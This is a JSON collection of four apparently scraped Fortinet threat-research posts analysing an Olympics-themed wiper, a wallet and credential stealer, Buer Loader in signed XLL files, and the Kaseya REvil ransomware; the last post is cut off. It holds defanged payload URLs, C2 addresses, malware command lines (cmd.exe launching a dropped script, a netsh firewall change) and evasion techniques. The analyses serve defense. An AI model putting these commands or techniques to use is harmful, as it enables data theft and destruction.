{
    "data": [
        {
            "https://www.fortinet.com/blog/threat-research/wiper-malware-riding-tokyo-olympic-games": {
                "metadata": {
                    "dateAccessed": "2021-07-27",
                    "dateCreated": "2021-07-26",
                    "source": "www.fortinet.com"
                },
                "text": "FortiGuard Labs Threat Research Report As society becomes increasingly reliant on technology, and as the world is more connected than ever, attacks by threat actors are not only more prevalent but also more disruptive. Because of the variety of agendas held by different malicious entities including—cybercriminals, hacktivists, nation states, etc.—attacks and disruptions targeted at high profile events are easy targets for sowing chaos, distributing malware, capturing or exfiltrating data, or even shutting down an event altogether. But regardless of the purpose, mass disruption and fear almost always occurs whether that was the intended goal of the attackers or not. In that context, FortiGuard Labs has observed new threat samples targeting the 2021 Tokyo Olympic games. It includes a wiper component, which, if successful, could cause a disruption to targeted machines. Background The most recent attack targeting the Olympics was documented during the 2018 Winter Games. The lure was a malicious Word document titled, \" Russian figure skater won the PyeongChang Winter Olympics in South Korea.doc.\" Once the user opened the document, the sample called and dropped a backdoor component, called Icefog. First discovered in 2013, the Icefog backdoor was used to attack sectors in the APAC region, with a focus on Japan and South Korea. The threat actor group responsible for Icefog is very methodical. Targets are carefully chosen, and the group seems to know what they are after beforehand. Icefog leveraged CVE-2012-0158—a older vulnerability in Windows common controls—relying on the fact that many system administrators, especially those in organizations with a large number of computers (governments, NGOs, companies, various organizations, etc.), often find patching cumbersome. Because of this, older exploits such as this are often a successfully exploited vector, even though this particular vulnerability was over 6 years old at the time of the attack. Fast forward to today, and in the wee hours of the Tokyo Olympic Games an interesting Wiper malware surfaced that reminded us of the same destructive malware that targeted the Pyeongchang Winter Games. This one is called “Olympic Destroyer.” Its file name is “【至急】東京オリンピック開催に伴うサイバー攻撃等発生に関する被害報告について.exe” (English translation: “(Urgent) Damage report in relation with cyber attacks targeting the Tokyo Olympics Games.exe”. Although this particular malware is listed in some OSINT reports as potentially related to the Olympic Destroyer sample, we have not observed this to be the case. We also do not have any information on the delivery mechanism or methods used by the attacker, nor its intended targets. However, given its ties to the Olympics, and the relative short time frame for exploitation, we feel it is important that we share what we know so far about this new wiper malware. Note : This is an evolving situation, and we will update this blog with relevant information when available. For a historical summary of attacks targeting the Olympic Games, please visit the Cyber Threat Alliance whitepaper, for which FortiGuard Labs was a contributing author: UPDATING THE 2020 SUMMER OLYMPICS THREAT ASSESSMENT Q. When was this malware found? The malware was uploaded to a publicly available file repository on July 20 th , 2021. A related file was subsequently found to have been uploaded to the same repository on July 17 th , 2021. Both files have a PDF icon. Q. Are Fortinet customers protected? Yes, FortiGuard Labs has the following AV coverage in place for the malware: W32/KillFiles.NKP!tr.ransom All known IOCs are blocked by FortiEDR ’s advanced real-time protection and have already been added to our cloud intelligence to prevent further execution on customer systems. All network IOC’s are blocked by the WebFiltering client. Q. How are the two files related? Those files do not work in tangent with each other. The malware uploaded on July 20 th has file deletion capability. The July 17 th sample includes everything but the destruction feature. Q. What does the malware do? The destroyer malware searches for and deletes files with the following file extensions in the compromised machine. .doc .docm .docx .dot .dotm .dotx .pdf .csv .xls .xlsx .xlsm .ppt .pptx .pptm .jtdc .jttc .jtd .jtt .txt .exe .log The malware also silently accesses a benign adult site. Lastly, the threat deletes itself when all actions are completed. Q. Does the malware have worm capability? No, the malware does not have any propagation mechanism. Q. Which organization did the malware target? Currently, there is no information available pertaining to the targets or victims. Q: Is there any similarity to Olympic Destroyer? No, this malware and Olympic Destroyer do not have any similarity in code. Q. Is there any nation state involvement? At this time, there is insufficient evidence to support the involvement of any nation state. Based on the relative lack of sophistication of the code, however, it seems unlikely that a nation state is behind the malware. Q: Is there anything note-worthy about the malware? The malware has one interesting trick up its sleeve to deter researchers—it checks to see whether its own code has been modified. For example, the non-wiper (July 17 th ) sample includes the following code. Essentially, what this means is that for certain functions, such as Enum_Procs, Check_Debuggers, and Check_VMX (seen in the above screenshot), the malware checks the first 5 bytes to see if it contains the “0xCC” opcode. This x86 assembly instruction stands for INT3, which tells debuggers to temporarily stop a running program. This method works as another anti-debug check because it detects to see if this function has been disabled. The wiper (July 20 th ) version of this malware goes a step further. Aside from checking for “0xCC”, it also checks for others such as “0xEB” (call), “0xE8” (jmp), and “0xE9” (jmp). These instructions divert program flow away from the intended flow created by the original programmer. One reason to divert program flow is to hook and monitor Windows APIs. An API monitor can report what a program is doing while it is running, saving researchers a lot of reverse engineering time and effort. However, if any of this code has been modified to enable monitoring, the wiper exits without performing any malicious activities. This is yet another anti-analysis check to avoid behavioral monitoring. More information about diverting program flow can be found on the Microsoft Detours website. As this is an ongoing event, FortiGuard Labs is monitoring the situation and will provide relevant updates for significant findings as they are uncovered. MITRE Classifications Defensive Evasion T1480: Execution Guardrails T1070.004: File Deletion T1027.002: Software Packing T1497: Virtualization/Sandbox Evasion T1497.001: System Checks T1497.003: Time Based Evasion Discovery T1083: File and Directory Discovery T1057: Process Discovery T1518.001: Security Software Discovery T1497: Virtualization/Sandbox Evasion T1497.001: System Checks T1497.003: Time Based Evasion Impact T1485: Data Destruction IOCs Sample SHA-256: fb80dab592c5b2a1dcaaf69981c6d4ee7dbf6c1f25247e2ab648d4d0dc115a97 c58940e47f74769b425de431fd74357c8de0cf9f979d82d37cdcf42fcaaeac32 Learn more about Fortinet’s FortiGuard Labs threat research and intelligence organization and the FortiGuard Security Subscriptions and Services portfolio . Learn more about Fortinet’s free cybersecurity training , an initiative of Fortinet’s Training Advancement Agenda (TAA), or about the Fortinet Network Security Expert program , Security Academy program , and Veterans program . Learn more about FortiGuard Labs global threat intelligence and research and the FortiGuard Security Subscriptions and Services portfolio."
            }
        },
        {
            "https://www.fortinet.com/blog/threat-research/fresh-malware-hunts-for-crypto-wallet-and-credentials": {
                "metadata": {
                    "dateAccessed": "2021-07-27",
                    "dateCreated": "2021-07-19",
                    "source": "www.fortinet.com"
                },
                "text": "FortiGuard Labs Threat Research Report Affected platforms:  Microsoft Windows Impacted parties:     Windows Users Impact:                     Collects sensitive information from victims’ computers Severity level:           Critical The FortiGuard Labs team was recently monitoring a new phishing campaign that uses the classic strategy of attaching a malicious Microsoft Word document to an unsolicited email that recipients were then asked to open. However, after I performed some deep research on this phishing campaign, I realized that a fresh malware was being delivered by the Word document designed to steal crypto wallet information and credentials from the victims’ infected devices. This malware doesn’t seem to belong to any known malware family, so we named it \"dmechant\", which is a constant string compiled in the malware sample. In this analysis I reveal my findings on this new malware, including how it is launched by the Word document, how the executable deploys itself on the victim’s device, what kind of sensitive information it searches for, and how stolen data is sent to the attacker via SMTP protocol. The Email Captured by FortiGuard Labs and the Word Document The spam email looks like an urgent order reminder from a purchase manager. It asks the recipient to review the materials in the attached Word document and then reply to the email as soon as possible. As with Word documents used in other phishing campaigns, this one includes a malicious Macro. Once opened, Word displays a security warning bar to inform the user of the risk of opening it. Interestingly, the content of this document is written in Spanish. Our best guesses are that this campaign is targeting multiple regions and the wrong document was attached, or this is being done deliberately to disguise the warning. In either case, I translated it into English using Google translate: Document created in an earlier version of Microsoft Office Word To see this content, click on \"enable editing\" from the yellow bar and then click \"Enable content\" The malicious Macro is executed once the button Enable Content is clicked. It has a VBA function called Document_Open(). This is a built-in function of the Macro and is called automatically when the document is opened. It then calls other functions to extract a JS (JavaScript) code into a file (rtbdxsdcb.js) under the %temp% folder. After that, it executes this “JS” file to finish the Macro’s work. Figure 1.3 is a screenshot of Macro VBA code displaying the JS code to be extracted and the process of writing into local file rtbdxsdcb.js, as well as it being executed. As you can see, it calls the Shell function to execute the command to run the JS file: cmd.exe /start %Temp%\\rtbdxsdcb.js Going through the JS code we find that its code is highly obfuscated. According to my analysis, its major task is to request the URL: hxxps[:]//cdn[.]discordapp[.]com/attachments/789415918744764447/857131714521202688/blessed[.]exe This downloads an executable file into %Temp% and saves it as erbxcb.exe, which is the payload file of this malware. Later, it creates a WScript.Shell object to start up the payload executable file on the infected device. Stage I – Starting the Payload Executable File The payload file, erbxcb.exe, is disguised as a PDF document to confuse the victim. Figure 2.1 shows what this file looks like. Once it starts, erbxcb.exe loads a block of compressed data from its PE file and decompresses it into a local file named %Temp%\\arwtfgxjpx80. (This is an encrypted PE file that I will discuss shortly.) It continues to dynamically extract a piece of code into the Stack memory and get it executed. The Extracted Code Mainly Performs: 1. It copies erbxcb.exe into a newly-created folder (%AppData%\\bplg) and renames “aoqn.exe”. As you can see in Figure 2.2, it was about to call a function (call 12F675, whose arguments are the source file and the target file) to copy this executable file into a new location. 2. It adds the copied file into the auto-run group in the system registry. To do this, it calls several APIs, like RegOpenKeyExW() and RegSetValueExW(). Figure 2.3 is a screenshot of the system registry with the added auto-run item, making this malware able to run at Windows startup. 3. It then loads the decompressed file %Temp%\\ arwtfgxjpx80, mentioned earlier, into memory and calls a function to decrypt it. As a result, it is able to  extract an executable PE file in memory. The dynamic code then creates a duplicate of the current process (erbxcb.exe) in a suspended state (by calling the API CreateProcessW() with a CREATE_SUSPENDED flag). In this way it is able to deploy the decrypted PE file into the newly-created second process. It then transports each section of the decrypted PE file into the second process to override its existing code. By calling the API SetThreadContext() it is able to set the entry point of the second process to the deployed PE file, and calling ResumeThread() lets the deployed PE file run inside the second process. The last thing the dynamic code does in the first process is to call the API ExitProcess() to exit the program. Stage II – Real Malware Runs Inside the Second Process According to my analysis, the decrypted PE file running inside the second process is written in MS Visual Basic 5.0-6.0 language without any packer. I dumped it into a local file, and Figure 3.1 shows the detection result in an analysis tool—Exeinfo PE. When it starts, it first gathers basic information about the victim’s device, such as current System Time, Windows Version, User Name, Computer Name, and so on. This information will be sent to the attacker along with other stolen data. It then sets %AppData%\\Microsoft\\Windows\\Templates as its home folder, where it puts some of its temporary files, such as extracted files, collected browser profiles, and collected crypto wallet data. Collecting Crypto Wallet Data This malware focuses on collecting profiles of crypto wallets (if installed) from the infected device. It has ten predefined crypto wallet software instances in the malware with a dynamically combined default profile folder path, as shown at the bottom of Figure 3.2. This crypto wallet software includes: Zcash, Armory, Bytecoin, Jaxx Liberty, Exodus, Ethereum, Electrum, Atomic, Guarda, and Coinomi. Once a crypto wallet is detected, it copies the entire folder containing the wallet’s profile data (including sub-folders and files—like the path listed in Figure 3.2) to its home folder (at “%AppData%\\Microsoft\\Windows\\Templates”). It then compresses the copied profile folders into a ZIP archive—CryptoWallets.zip—which is eventually sent to the attacker as an email’s attachment. As far as we have been able to determined, the attacker could obtain your bitcoin private key, bitcoin address, crypto wallet address and other significant information. Collect Saved Credentials by Executing an Extracted EXE file It also extracts an EXE file (“sdedffggdg.exe”) from the Resource section, which is written by .Net Framework. This malware collects credentials from predefined browsers and saves the collected information into a newly-created credentials.txt file under its home folder. Figure 3.3 is an example of a credentials.txt file, after it executes the extracted .net EXE file(“sdedffggdg.exe”), where it shows the credentials collected from the Google Chrome browser from my testing device. “sdedffggdg.exe” is able to collect saved credentials from the following predefined browsers (if installed): \"Chrome\",\"Opera\",\"Yandex\",\"360 Browser\",\"Comodo Dragon\",\"CoolNovo\",\"SRWare Iron\",\"Torch Browser\",\"Brave Browser\",\"Iridium Browser\",\"7Star\", \"Amigo\",\"CentBrowser\",\"Chedot\",\"CocCoc\",\"Elements Browser\",\"Epic Privacy Browser\",\"Kometa\",\"Orbitum\",\"Sputnik\",\"uCozMedia\",\"Vivaldi\",\"Sleipnir 6\", \"Citrio\",\"Coowon\",\"Liebao Browser\",\"QIP Surf\" and \"Edge Chromium\". Collect Other Saved Credentials Other than the browsers identified above, this malware also collects saved credentials from other installed software clients, including Outlook, CoreFTP, FileZilla, NordVPN, FoxMail, Thunderbird, and similar browsers such as Firefox, Waterfox, K-Meleon, Cyberfox, and BlackHawk. In the memory, shown in Figure 3.4, you can see an example of the credentials just after they are collected from the application FileZilla on my research machine. Each group of credentials consists of URL, Username, Password, and Application. Each group of the credentials is split by “=============================”. Stage III – Sending Collected Data to the Attacker via SMTP This malware has a specific function used to generate and send an email that includes the stolen sensitive information using the created CDO.Message object. Figure 4.1 shows a snippet of this function code (I only included the key code). As you can see, it calls rtcCreateObject2() to create the CDO.Message object, which then sets the email’s From, To, Subject, TextBody, and AddAttachment fields. Subject starts with a keyword and follows with the victim’s Computer Name and User Name. The keyword string should be one of the “CryptoWallets” for the crypto wallet profile, “Passwords” for credentials, or “Keylogger” for key logger data (this function was not enabled in this version). After an email is created, the CDO.Message’s Send() function is called to send the Email out to the attacker’s email address. Below are two examples of sending these emails via SMTP protocol. Figure 4.2 sends an email with the crypto wallets profiles in the attachment CryptoWallets.zip to the attacker. The attachment is encoded in base64. Figure 4.3 shows sending stolen credentials, where the text body contains basic information, stolen credentials, and its attachment includes collected browser profiles that contain saved credentials. The attachment is also encoded in base64. Conclusion In this post I first detailed the phishing email captured by our FortiGuard Labs and its attached Word document. Next, I demonstrated how a JS file is extracted and executed by the Macro to download the malware’s payload executable file. I also introduced how the malware adds itself into the auto-run group and runs in the second process. I also demonstrated the main tasks of the malware, how and what kind of sensitive information it collects from the infected device, including crypto wallet profile information and the credentials of browsers and clients, and how that collected data is sent to the attacker using the SMTP protocol. I mentioned many processes in this blog. To help you better comprehend the relationship of the relevant processes initiated by the opening of the Word document, I have made a screenshot of the Process Tree, shown in Figure 5.1. The involved processes are WINWORD.EXE, cmd.exe, WScript.exe, erbxcb.exe, and sdedffggdg.exe. Fortinet Protections Fortinet customers are already protected from this malware by FortiGuard’s Web Filtering , AntiVirus, FortiEDR and CDR (content disarm and reconstruction) services, as follows: The downloading URL has been rated as \" Malicious Websites \" by the FortiGuard Web Filtering service. The Word document and downloaded executable file are detected as \" VBS/Agent.4885!tr \" and \" W32/Kryptik.J!tr \" and are blocked by the FortiGuard AntiVirus service. FortiMail users are protected by FortiGuard AntiVirus, which detects the original Word document as a malicious attachment in the phishing email, and further protected with the CDR service, which can be used to neutralize the threat of any macros within Office documents. FortiEDR detects the downloaded executable file as malicious based on its behavior. IOCs URLs: hxxps[:]//cdn[.]discordapp[.]com/attachments/789415918744764447/857131714521202688/blessed.exe Sample SHA-256: [Ncc June Purchase -Contract 0262320216486488574.doc] 105D9496D4F80AE5EF3C7642F55117B65A10398AFE5FF9C30D706FA9873CFD6A [erbxcb.exe or aoqn.exe] 9C7023EFB920442DFD73D96D303A1B2CFB53A727F2B6B55DE8B4D25BC90FE95E Learn more about Fortinet’s FortiGuard Labs threat research and intelligence organization and the FortiGuard Security Subscriptions and Services portfolio . Learn more about Fortinet’s free cybersecurity training , an initiative of Fortinet’s Training Advancement Agenda (TAA), or about the Fortinet Network Security Expert program , Security Academy program , and Veterans program . Learn more about FortiGuard Labs global threat intelligence and research and the FortiGuard Security Subscriptions and Services portfolio."
            }
        },
        {
            "https://www.fortinet.com/blog/threat-research/signed-sealed-and-delivered-signed-xll-file-delivers-buer-loader": {
                "metadata": {
                    "dateAccessed": "2021-07-27",
                    "dateCreated": "2021-07-19",
                    "source": "www.fortinet.com"
                },
                "text": "FortiGuard Labs Threat Research Report Affected Platforms: Windows Impacted Users: Any organization or individual Impact: Remote attackers gain control of the vulnerable systems Severity Level: Moderate Introduction - Signed XLL File Delivers Buer Loader FortiGuard Labs has discovered a malicious spam campaign that uses the names of two well-known corporate entities as a social engineering lure to trick a target into opening a maliciously crafted Microsoft Excel document. When opened, the document contacts a remote server that downloads a malicious payload from a predefined website. What makes this campaign different from similar malicious spam campaigns is the use of a signed Microsoft Excel file with an .XLL file extension, rather than the standard .XLS file extension. In this blog, we will examine details of this attack as well as the infrastructure they used. The reader will see the multi-step process used to ensure that the target would be infected, including evasive steps to bypass detection technologies via the .XLL file extension and the use of a valid signed digital certificate. What Exactly is an XLL File Extension? An XLL file extension is used by Excel Add-in files to allow third party applications to add extra functionality to Excel. XLL files are similar in structure to DLL files. They allow for calls of specific Excel commands, worksheet functions from Visual Basic (VBA), registered XLL commands, and from functions referenced in Excel. The use of XLL files is not as common as a maliciously crafted XLS file that contain macros or exploits, so it is a rarely observed evasion tactic used by threat actors to bypass endpoint detection. Complicating things even further, the malicious XLL file used in this campaign (at the time of analysis) is signed with a valid digital signature and chained accordingly. Signed malware containing valid digital certificates are used by threat actors to evade detection as they are trusted by antivirus and other endpoint security software. Because a company or organization is vetted by a certificate authority (CA) before the issuance of a digital certificate, operating systems and anti-virus software treat files signed with these certificates as clean, which ultimately allows the signed file to operate with impunity. And finally, when run, the maliciously crafted Excel file connects to a predetermined server to download the payload, which in this case is Buer Loader. Campaign Details The modus operandi of these attackers is spam email. Based on our observations, these attacks do not appear to be targeted, but instead appear to be blanketed campaigns looking for low hanging fruit—i.e., anyone willing to open the malicious attachment. The email in the example below is a variant of the classic shipment courier status email, with this variation using DHL and Amazon trademarks as the lure. This specific example was sent to an individual and not to an organization, further reinforcing the idea that these campaigns are not targeted. This malicious spam appears to be rushed or the product of non-native English speakers as there are grammatical issues—“We sincerely sorry due to inconvenience...”—which makes it less than convincing, even to the untrained observer. (Incidentally, the recipient of this particular email has had their email username and password posted online previously. And according to haveibeenpwned[.]com, this email address has also been exposed in four separate breaches.) Contained within the email is an attachment with the file name “Detailed Invoice.xll.” Looking at the attachment we can see that it is digitally signed and chains appropriately. The digital signature is assigned to HORUM, with a reference email address of admin[@]khorum[.]ru: The certificate appears to be valid until 3/24/2022: Visiting the website directly offers no further details as to what entity is behind this campaign: Same with the WHOIS information: The Infection Chain When the user opens the XLL file, the Excel file triggers on xlAutoOpen in a similar fashion to a macro. The following image shows the export name is the same. The export attempts to contact the following URL: hxxp://dmequest[.]com/dme/images/portfolio/products/1/csrsc.exe hosted on 68[.]67.75.66. Analysis reveals that the IP address serving the executable file belongs to a webhosting reseller in Florida in the United States. Further analysis shows that this is most likely a compromised server and, based on experience, it is probably controlled by affiliates of the bad actors or the bad actors themselves. Taking a deeper inspection of the server we see that it contains an open directory that is public. In the folder where csrsc.exe resides, a directory timestamp appears to have been changed to look like it is one of the original files from 2016. However, analysis revealed that the csrsc.exe file was actually compiled in 2021. The directory also contains several other files from June 2021 that may be from a different campaign. We have also observed older campaigns over the past several years being downloaded from this same IP address. Some of these campaigns involve serving fake data recovery software as well as PayPal themed phishing sites. However, it is difficult to determine if these attackers are all related, or if this is simply a leased server used by multiple threat actors. A passive DNS entry of domains that resolved to this IP address highlights a variety of businesses entities, but overall, they appear to be a random collection of websites of customers belonging to the webhosting reseller. Once the XLL file finishes downloading csrsc.exe, the downloaded file is saved as: %PUBLIC%\\srtherhaeth[.]eXe Further Insight into srtherhaeth.exe The downloaded file is Buer Loader. First discovered in 2019, Buer Loader is Malware-as-a-Service that was first used by threat actors to deliver banking Trojans and various other malware. As it gained popularity it was later adopted by Ryuk threat actors to help establish an initial foothold on targeted networks. Once this foothold was established, the infamous Ryuk ransomware was then deployed. Buer Loader has evolved since then and the following provides further insight into this latest version. Analysis of srtherhaeth.exe reveals what is likely an invalid or expired signature, and because of this it did not chain appropriately and could not be verified as a legitimate certificate. Further examination of the file revealed the following: File Version Information Copyright Cistae Description Weenong Original Name Detrition Internal Name Phytoflagellata File Version 0, 1, 3, 1 Comments Nonrival Date signed 2010-09-08 00:04:00 RUST Crates and Toolchains srtherhaeth.eXe is almost 2 MB. In the world of malware, files in this size range are not common. This is a newer variant of Buer loader that has been completely rewritten, as first pointed out by ProofPoint in May of 2021. A deeper dive reveals that it was written in RUST and uses RUST crates/libraries, which explains the file size anomaly versus traditional malware. Consistent with the latest version of Buer Loader, this version was observed incorporating the whoami ( https://github.com/libcala/whoami ) RUST crate, which allows for details such as current user info including username, full name, preferred language, OS name/version, and environment it is located in. The version used is whoami-1.1.1, which was released on 2021-03-13 ( https://github.com/libcala/whoami/blob/main/CHANGELOG.md ) One interesting component of RUST are toolchains. In layman’s terms, RUST toolchains are collections of programs along with multiple dependencies needed to compile a RUST application. RUST toolchains observed used so far by Buer were: ureq 2.0.2 A minimal HTTP request library minreq A simple, minimal-dependency HTTP client with less features than ureq. A user-agent string of “something/1.0.0” Ring According to the official site, Ring is a safe, fast, small crypto focused on general-purpose cryptography. It uses RUST with BoringSSL's cryptography primitives. Finally, the file receives additional instructions from its command and control (C2) server: hxxps://shipmentofficedepot[.]com (195[.]123.234.11). Insight into C2 shipmentofficedepot[.]com. (195[.]123.234.11) Detailed analysis over a 30-day period revealed a large majority of connections from US-based victims (66%), followed, interestingly enough, by Mozambique (22%), Singapore (5%), and other countries at (1% or less). A cursory review of our telemetry indicates that over 1/3 of the traffic occurred over port 22 (SSH/SFTP). Almost all of these port 22 connections originate from a reportedly compromised server. Since this is a shared server hosting multiple websites, this information indicates that the provider may not mind hosting malicious websites. Conclusion While the use of malicious XLL files is not new, it is rarely used. But couple that with the fact that a valid digital signature was used (at the time of the attack) and the level of sophistication and resourcefulness of these attackers increases in the minds of threat researchers. Even though the email lure used was basic, this may only indicate that the group behind this campaign was simply testing the effectiveness of their techniques. However, the techniques used in this campaign are harder to spot than the average attack. The examples in this blog highlight a carefully thought-out campaign by the attacker, who took the needed time and steps to ensure that their work would not be detected before infection. Thankfully, Fortinet customers running the latest definition sets are already protected against this campaign. Fortinet Protections FortiGuard Labs has AV coverage for the samples mentioned in this blog as: W32/Agent.ADBL!tr W32/Buerak.TO!tr.dldr W32/Kryptik.HLHY!tr W32/PossibleThreat All known network IOCs are blocked by the WebFiltering client. All known IOCs are blocked by FortiEDR ’s advanced real-time protection and have already been added to our cloud intelligence to prevent further execution on customer systems. FortiMail , powered by threat intelligence from FortiGuard Labs , can detect and block phishing attacks and remove or neutralize malicious attachments Fortinet’s Phishing Simulation Service, FortiPhish , can also be used to proactively test the susceptibility of your organization to these kinds of phishing attacks. We also suggest that our readers go through Fortinet’s free NSE Training : NSE 1—Information Security Awareness, which has a module on Internet threats designed to help end users learn how to identify and protect themselves from phishing attacks. IOCs Detailed Invoice.xll 6F9D943F88F715FF8A122D7B88AF986C1A9F38F4484E48CDE768CF22A5935EFE srtherhaeth.eXe (Buer Loader) C28ABAAAD1B7B2C7A37F28E974E8214F07C88FEFFEF986E0A60A44AB0FA575AA Payload Download URI hxxp://dmequest[.]com/dme/images/portfolio/products/1/csrsc.exe C2 195[.]123.234.11 Additional Buer Loader (contacts 195[.]123.234.11) bd734170160b363e70602626baab37a1eb93cfb2d254cf17b6ff1b5e7313b568 9d1be741e3b09057cdaffb6e87d602afff496dee364767b161dfaab7e639866d MITRE ATT&CK Initial Access T1566.001 – Spearphishing Attachment Execution T1204.002 – Malicious File Persistence T1547.001 – Registry Run Keys / Startup Folder Defense Evasion T1218 – Signed Binary Proxy Execution T1480.001 – Environmental Keying T1497.001 – System Checks T1553.002 – Code Signing Discovery T1082 – System Information Discovery T1497.001 – System Checks Collection T1005 – Data from Local System Command and Control T1071.001 – Web Protocols T1105 – Ingress Tool Transfer Exfiltration T1041 – Exfiltration Over C2 channel Learn more about Fortinet’s FortiGuard Labs threat research and intelligence organization and the FortiGuard Security Subscriptions and Services portfolio . Learn more about Fortinet’s free cybersecurity training , an initiative of Fortinet’s Training Advancement Agenda (TAA), or about the Fortinet Network Security Expert program , Security Academy program , and Veterans program . Learn more about FortiGuard Labs global threat intelligence and research and the FortiGuard Security Subscriptions and Services portfolio."
            }
        },
        {
            "https://www.fortinet.com/blog/threat-research/dll-side-loading-technique-used-in-recent-kaseya-ransomware-attack": {
                "metadata": {
                    "dateAccessed": "2021-07-27",
                    "dateCreated": "2021-07-13",
                    "source": "www.fortinet.com"
                },
                "text": "FortiGuard Labs Threat Research Report Affected Platforms : Windows Impacted parties : Windows Users Impact : Data encryption, Data destruction Threat Severity : Critical Introduction to the Kaseya Ransomware Attack In this article we examine the ransomware used in the recent Kaseya attack . We will see what happens when a machine is infected by this ransomware by looking at some of the visible Indicators of Compromise, such as modified wallpaper, several “<random string>-readme.txt” files in different folders, and changes in the filenames with < random string > extensions. We will also discuss in more details how DLL side-loading was implemented along with other malware tricks that the ransomware used. Fortunately, FortiEDR detects and blocks the DLL side-loading event when the ransomware executes the valid application, such as MsMpEng.exe, while it loads the malicious payload, mpsvc.dll. As a result, customers will not be able to see all of the related IOCs because the malware is prevented from running. Ransom Note and Visible IOCs One common element of most ransomware is the ransom note. Once its infection routine is completed, this ransomware variant replaces the desktop wallpaper with a dropped .bmp file notifying the victim to look for a file containing instructions, as shown in Figure 1a. All accessible folders have a copy of the ransom note file inserted. The ransom note is dropped as a text file using a random filename, such as “5f03r-readme.txt”. The filename format uses “<random string>-readme.txt”. Encrypted files in the folder have the extension name of “5f03r” or the <random string> added to the filename. The files used for DLL side-loading technique are also dropped in the same path as the wallpaper bmp file (Figure 1d). Technical Analysis Common Malware Tricks Over the years, a variety of malware tricks have been developed and employed differently by various malicious actors. These include anti-debugging, anti-analysis, anti-reversing, and virtually every “anti-everything” concept that malicious authors can think of. One of the most common malware tricks is hiding its APIs . The main purpose of this strategy is to avoid being detected by signature-based detection tools that looks for specific combinations of APIs used by malware. This trick also makes deeper analysis take longer because analysts are blind as to which APIs they need to be looking for. Looking deeper, these initial APIs are not very important to the malware. Instead, it resolves its needed APIs using a simple hashing computation. The malware includes a list of hash values that correspond to the APIs it needs. It first resolves the LoadLibraryA API to load the needed DLL file. It grabs the first available API name from the loaded library, calculates the hash, and then compares it to the current API hash. If it is the right hash, it gets the index of the API name and the API address pointed to by the index. If it is not the right hash, the malware gets the next API name and continues its calculations. The ransomware repeats this same process until it resolves the API addresses that the malware needs. This is quite a simple trick. Most malware hides its APIs and resolves the right addresses using different combinations of LoadLibraryA, GetProcAddress, and other APIs. They also use different combinations of encryption, calculations, and encodings. But at the end of the malware’s API addresses resolving algorithm we still get the list of APIs with their proper addresses. You can see them if you look in the right location in the malware code before it executes its infection routine. Decrypting the Ransom Note To extract the ransom note, REvil ransomware decrypts a large chunk of bytes using a simple RC4 algorithm to generate a base64 blob of string. This string is then decoded by calling the CryptStringToBinaryW API, as shown in Figure 4. The RC4 algorithm shown above is the same code that decrypts most of the strings that the malware needs, including the C&Cs used to exfiltrate information from the infected machine (Figure 5). The complete list of C&Cs can be found in Appendix B: IOCs. MITRE ATT&CK Framework Analysis The MITRE ATT&CK Framework is a globally accessible knowledge base of adversary tactics and techniques based on real-world observations. It provides threat researchers and responders with a system for examining cyberattacks, allowing techniques and events to be more easily analyzed by researchers and presented in a way that help victims to better understand where in the attack cycle certain events occur. Critical elements of this ransomware have been mapped to the MITRE ATT&CK Framework. Two of its key strategies tied to specific MITRE ATT&CK TTP (tactics, techniques, and procedures) IDs are detailed below. The full set of MITRE ATT&CK elements are listed in the Appendix. MITRE T1562.004 Disable or Modify System Firewall Technique The ransomware exposes the infected machine within the network by running “ netsh advfirewall firewall set rule group=\\\"Network Discovery\\\" new enable=Yes ”, using WinExec API. MITRE T1574.002 Hijack Execution Flow: DLL Side-Loading Technique While this ransomware has numerous tricks up its sleeves, for this article we will focus on its DLL Side-Loading trick. It uses MITRE technique T1574.002 Hijack Execution Flow: DLL Side-Loading. This technique is commonly employed by malware by dropping a malicious DLL within a search order of a valid application. This search order provides a Windows application with a list of locations where it can find a valid DLL or libraries. The application then uses the DLL that is available, whichever comes first. When the application executes it then loads the malicious DLL if it is available first rather than the valid DLL. However, this ransomware does a little more than that. Instead of just dropping the malicious “mpsvc.dll”, it also drops the valid application, MsMpEng.exe. This is a Windows Defender executable and normally not detected by security applications. After dropping both the executable and the DLL file, the ransomware executes MsMpEng.exe using CreateProcessW API. Walkthrough on How This Ransomware Uses the DLL Side-Loading Technique Both mpsvc.dll and MsMpEng.exe are found within the ransomware in the resource section of the file. To access the content of the resource section of the file, the ransomware uses FindResourceW, LoadResource, and LockResource APIs to grab the contents of the resource section. The resource section has two main elements, “MODLIS” and “SOFTIS”. These provide the contents for “mpsvc.dll” and “MsMpEng.exe”, respectively (Figure 7a). The ransomware tries to access “mpsvc.dll” in the “C:\\Windows” folder. If it fails, it will create “mpsvc.dll” in “AppData\\Local\\Temp”. Similar steps are taken to drop the MsMpEng.exe to the Temp folder. Afterwards, the malware initiates its DLL Side-Loading technique by executing MsMpEng.exe using the CreateProcessW API. Executing MsMpEng.exe on its own is not malicious, but MsMpEng loads the malicious “mpsvc.dll” as one of the needed libraries. The application is not able to tell whether the loaded library is malicious. So, once the malicious library is loaded, it executes the encryption of files along with the rest of its infection routines. Conclusion - Kaseya Ransomware Attack This ransomware variant drops a copy of its ransom note file, “<random string>-readme.txt”, in every accessible folder. It then tries to encrypt as many files as it can, giving encrypted files an extension name similar to the random string in the ransom note file name. It also uses the Windows Defender executable, MsMpEng.exe, to avoid detection, but it side-loads the malicious library, “mpsvc.dll”, to employ its payload. The future variant of this ransomware might use a different valid executable, but so far, we have only observed MsMpEng.exe. There are different variants of this ransomware where the strings, including the ransom note and C&Cs, are encrypted using randomized keys within its code. But once these strings are decrypted, they are nearly the same with some minor differences, such as the randomized string for the extension name of the encrypted files. Lastly, it is important to remind individuals and teams tasked with identifying and responding to threats that there are many evasion techniques that threat actors can use to circumvent security controls, and they continue to evolve. Organizations are advised to likewise evolve their security controls to ensure they can effectively fend off the latest threats. To that end, it is helpful to keep in mind that even though these threats are becoming increasingly sophisticated, they still tend to be noisy, and a good monitoring solution can go a long way towards interrupting the attack chain. Fortinet Protections FortiEDR detects and blocks the DLL side-loading event of this ransomware when agent.exe executes MsMpEng.exe (Windows Defender) and loads the mpsvc.dll (malicious library) payload. In addition, all published IOCs have been added to our Cloud intelligence service and will be blocked if executed on customer systems. The FortiGuard Responder team has published a Knowledge Base analysis on Kaseya: “ How FortiEDR detects Kaseya supply chain ransomware attack .” FortiGuard Labs has AV coverage for known publicly available samples as: W32/Sodinokibi.EAD4!tr.ransom W32/Sodinokibi.8859!tr.ransom W32/Sodinokibi.5421!tr.ransom The FortiGuard AntiVirus service is supported by FortiGate , FortiMail , FortiClient , and FortiEDR . The Fortinet AntiVirus engine is a part of each of those solutions as well. As a result, customers who have these products with up-to-date protections are protected. FortiGuard 